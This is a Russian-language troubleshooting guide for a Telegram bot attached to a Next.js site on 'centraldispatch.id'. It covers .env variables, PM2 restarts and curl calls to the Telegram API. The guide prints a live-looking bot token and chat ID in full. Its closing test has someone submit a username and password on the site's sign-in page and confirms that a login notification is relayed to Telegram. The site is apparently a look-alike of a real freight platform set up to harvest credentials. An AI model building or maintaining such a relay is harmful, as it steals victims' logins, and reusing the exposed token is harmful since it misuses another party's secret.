# 🔧 Исправление проблемы с Telegram ботом

## Проблема: Бот не отправляет сообщения

### Возможные причины:

1. **Переменные окружения не загружены**
2. **Неправильный Chat ID**
3. **Бот не может отправить сообщение (нужно начать диалог)**

## Решение:

### Шаг 1: Проверить переменные окружения на сервере

```bash
ssh centraldispatch
cd /var/www/centraldispatch.id

# Проверить .env файл
cat .env | grep TELEGRAM

# Или проверить через PM2
pm2 describe centraldispatch-nextjs | grep TELEGRAM
```

Если переменных нет, добавить в `.env`:
```env
TELEGRAM_BOT_TOKEN=8569212803:AAGDp_ETyyHqs_V_h2WChU184I_mGOkrJDs
TELEGRAM_CHAT_ID=5257327001
```

### Шаг 2: Убедиться, что начат диалог с ботом

**Важно:** Бот может отправлять сообщения только если пользователь начал с ним диалог.

1. Откройте Telegram
2. Найдите бота: @Li0Lr8oWB13fdw615J9ebot
3. Нажмите "Start" или отправьте любое сообщение боту
4. После этого бот сможет отправлять вам сообщения

### Шаг 3: Проверить Chat ID

```bash
# На сервере
curl "https://api.telegram.org/bot8569212803:AAGDp_ETyyHqs_V_h2WChU184I_mGOkrJDs/getUpdates"
```

Найдите в ответе `"chat":{"id":5257327001}` - это ваш Chat ID.

Если Chat ID отличается, обновите его в `.env` или `ecosystem.config.js`.

### Шаг 4: Перезапустить приложение с переменными

```bash
ssh centraldispatch
cd /var/www/centraldispatch.id

# Если используете .env файл
pm2 restart centraldispatch-nextjs --update-env

# Если используете ecosystem.config.js
pm2 restart centraldispatch-nextjs --update-env
pm2 save
```

### Шаг 5: Проверить логи

```bash
pm2 logs centraldispatch-nextjs --err --lines 50
```

Ищите ошибки с префиксом `[TELEGRAM]` или `[API LOGIN]`.

## Тестовая отправка сообщения

```bash
curl -X POST "https://api.telegram.org/bot8569212803:AAGDp_ETyyHqs_V_h2WChU184I_mGOkrJDs/sendMessage" \
  -H "Content-Type: application/json" \
  -d '{
    "chat_id": "5257327001",
    "text": "Тестовое сообщение от бота"
  }'
```

Если получаете `{"ok":true}`, значит бот работает и может отправлять сообщения.

## Проверка работы

1. Откройте https://centraldispatch.id/sign-in
2. Введите username и password
3. Нажмите SIGN IN
4. Проверьте логи на сервере:
   ```bash
   pm2 logs centraldispatch-nextjs --lines 20
   ```
5. Должны увидеть:
   - `[TELEGRAM] Отправка уведомления о входе...`
   - `[TELEGRAM] Сообщение успешно отправлено`















